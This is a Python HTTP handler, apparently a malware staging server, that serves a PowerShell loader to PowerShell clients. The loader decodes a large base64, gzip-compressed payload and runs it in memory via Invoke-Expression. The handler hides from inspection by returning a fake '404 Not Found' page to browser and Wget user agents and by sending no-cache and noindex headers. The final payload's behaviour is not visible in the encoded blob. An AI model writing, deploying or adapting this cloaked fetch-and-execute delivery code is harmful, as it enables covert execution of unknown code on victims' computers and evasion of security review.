import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _base import BaseHandler

_PAYLOAD = (
    "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"
)

_LOADER = (
    "$d=[Convert]::FromBase64String('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')\n"
    "$s=New-Object IO.MemoryStream(,$d)\n"
    "$g=New-Object IO.Compression.GZipStream($s,[IO.Compression.CompressionMode]::Decompress)\n"
    "iex (New-Object IO.StreamReader($g)).ReadToEnd()\n"
)

_BROWSER_AGENTS = ("Mozilla", "Chrome", "Safari", "Firefox", "Edge", "Opera", "Wget")


class handler(BaseHandler):
    def do_GET(self):
        ua = self.headers.get("User-Agent", "")
        if "PowerShell" not in ua and any(b in ua for b in _BROWSER_AGENTS):
            self.send_response(404)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h1>404 Not Found</h1>")
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        self.send_header("X-Robots-Tag", "noindex, nofollow")
        self.end_headers()
        self.wfile.write(_LOADER.encode())
